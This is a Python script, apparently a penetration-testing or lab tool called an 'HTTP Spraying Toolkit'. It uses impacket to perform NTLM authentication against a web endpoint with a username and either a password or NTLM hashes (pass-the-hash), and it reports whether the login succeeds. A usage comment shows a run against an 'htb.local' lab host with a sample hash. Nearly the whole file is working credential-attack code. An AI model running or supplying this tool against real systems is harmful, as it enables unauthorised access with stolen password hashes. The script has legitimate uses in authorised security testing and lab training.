#!/usr/bin/python3
from __future__ import division
from __future__ import print_function
import sys
import argparse
import re
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, getNTLMSSPType1, getNTLMSSPType3
import traceback
try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
import base64
import ssl
from urllib.parse import urlparse
from binascii import a2b_hex

def http_login(hostname, endpoint, authentication, username, password, domain, lmhash, nthash, ssl):
    if lmhash != '' or nthash != '':
        if len(lmhash) % 2:     lmhash = '0%s' % lmhash
        if len(nthash) % 2:     nthash = '0%s' % nthash
        try:
            lmhash = a2b_hex(lmhash)
            nthash = a2b_hex(nthash)
        except:
            pass
    
    if ssl:
        session = HTTPSConnection(hostname, 443)
    else:
        session = HTTPConnection(hostname, 80)
    
    #init
    session.request('GET', endpoint)
    res = session.getresponse()
    res.read()
    if res.status != 401:
        print('Status code returned: %d. Authentication does not seem required for URL' % res.status)
    try:
        print("[*] WWW-Authenticate: ", res.getheader('WWW-Authenticate'))
        if authentication not in res.getheader('WWW-Authenticate'):
            print("[-] specified authentication header '%s' is not supported by server" % authentication)
            return False
        if authentication not in res.getheader('WWW-Authenticate'):
            print('%s Auth not offered by URL, offered protocols: %s' % (authentication, res.getheader('WWW-Authenticate')))
            return False
    except (KeyError, TypeError):
        print('No authentication requested by the server')
        return False
    
    #neg
    negotiateMessage = getNTLMSSPType1("", "", True)
    print("[*] Type1: ", negotiateMessage.getData())
    negotiate = base64.b64encode(negotiateMessage.getData()).decode("ascii")
    headers = {'Authorization':'%s %s' % (authentication, negotiate)}
    session.request('GET', endpoint , headers=headers)
    res = session.getresponse()
    res.read()
    try:
        serverChallengeBase64 = re.search('%s ([a-zA-Z0-9+/]+={0,2})' % authentication, res.getheader('WWW-Authenticate')).group(1)
        serverChallenge = base64.b64decode(serverChallengeBase64)
        challenge = NTLMAuthChallenge()
        challenge.fromString(serverChallenge)
        print("[*] Type2: ", challenge.getData())
    except (IndexError, KeyError, AttributeError):
        print('No NTLM challenge returned from server')
        return False
    
    #auth
    ntlmChallengeResponse, exportedSessionKey = getNTLMSSPType3(negotiateMessage, challenge.getData(), username, password, domain, lmhash, nthash)
    print("[*] Type3: ", ntlmChallengeResponse.getData())
    auth = base64.b64encode(ntlmChallengeResponse.getData()).decode("ascii")
    headers = {'Authorization':'%s %s' % (authentication, auth)}
    session.request('GET', endpoint , headers=headers)
    res = session.getresponse()
    res.read()
    if res.status == 401:
        print("[-]HTTP server returned error code 401, STATUS_ACCESS_DENIED")
    else:
        print('[+]HTTP server returned error code %d, treating as a successful login' % res.status)

def main():
    #python httpspray.py -url http://192.168.73.50/iisstart.htm -username dsc -domain htb.local -hashes aad3b435b51404eeaad3b435b51404ee:2B576ACBE6BCFDA7294D6BD18041B8FE
    parser = argparse.ArgumentParser(add_help = True, description = "HTTP Spraying Toolkit")
    group = parser.add_argument_group('authentication')
    group.add_argument('-url', action='store', metavar = "url", help='NTLM enabled endpoint')
    group.add_argument('-username', action="store", metavar = "username", help='Username')
    group.add_argument('-domain', action="store", metavar = "domain", help='domain')
    group.add_argument('-password', action="store", metavar = "password", help='password')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-authentication', choices=['NTLM'], nargs='?', default='NTLM', metavar="NTLM",
                       help='authentication header')
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()
    if options.password is None and options.hashes is None:
        parser.print_help()
        sys.exit(1)
    if options.username is None:
        parser.print_help()
        sys.exit(1)
    if options.url is None:
        parser.print_help()
        sys.exit(1)
    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''
    if options.password is None:
        password = ''
    else:
        password = options.password
    if options.domain is None:
        domain = ''
    else:
        domain = options.domain

    uparse = urlparse(options.url)
    ssl = False
    if uparse.scheme == 'https':
        ssl = True
    
    http_login(uparse.netloc, uparse.path, options.authentication, options.username, password, domain, lmhash, nthash, ssl)

if __name__ == "__main__":
    main()
